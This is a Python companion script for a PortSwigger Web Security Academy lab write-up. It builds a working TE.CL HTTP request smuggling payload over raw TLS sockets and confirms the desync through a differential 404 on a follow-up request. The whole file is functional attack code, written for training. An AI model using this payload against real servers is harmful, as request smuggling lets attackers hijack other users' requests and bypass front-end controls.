#!/usr/bin/env python3
"""
HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 02-confirming-te-cl-differential-responses.md

What this does:
    Sends a TE.CL smuggling payload over a raw TLS keep-alive connection: the
    front-end trusts Transfer-Encoding and forwards the whole chunked body,
    but the back-end trusts a short, fixed Content-Length and stops reading
    right after the chunk-size line. That leaves the complete smuggled
    "GET /404check" request (plus the outer chunk's closing terminator)
    sitting in the back-end's buffer as the start of the next request. A
    normal follow-up "GET /" on the same connection merges onto that
    leftover data and comes back 404 if the desync is real.

    The chunk-size arithmetic (Content-Length = len(hex chunk size) + 2) is
    exact and unforgiving -- a normal HTTP client that recalculates
    Content-Length for you defeats this before it starts, so this uses raw
    sockets over TLS exactly like the original solve.

Usage:
    python 02-confirming-te-cl-differential-responses.py <lab-url>
    e.g. python 02-confirming-te-cl-differential-responses.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    (stdlib only -- socket, ssl)
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 1.0) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_tecl_payload(host: str, smuggled_request: str, path: str = "/") -> bytes:
    """TE.CL payload: front-end trusts Transfer-Encoding (forwards the full
    chunked body, terminator included), back-end trusts Content-Length --
    set short enough here to cut its read off right after the chunk-size
    line, leaving the rest of the chunk as leftover request bytes."""
    smuggled_with_term = smuggled_request + "\r\n0\r\n\r\n"
    chunk_size = hex(len(smuggled_request.encode()))[2:]
    chunked_body = f"{chunk_size}\r\n{smuggled_with_term}"
    cl = len(chunk_size) + 2  # back-end reads only the chunk-size line + \r\n

    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    )
    return (headers + chunked_body).encode()


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    smuggled = (
        "GET /404check HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    attack = build_tecl_payload(host, smuggled)
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    for attempt in range(1, 4):
        responses = send_raw_keep_alive(host, [attack, normal])
        r2 = responses[-1] if responses else b""
        status_line = r2.split(b"\r\n", 1)[0].decode(errors="replace") if r2 else "(no response)"
        print(f"[*] Attempt {attempt}: follow-up response -- {status_line}")
        if b"404" in r2:
            print("[+] Differential 404 confirmed -- the back-end parsed our smuggled")
            print("    GET /404check as a real request and merged it with the follow-up.")
            break
    else:
        print("[-] No 404 observed after 3 attempts -- TE.CL desync not confirmed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
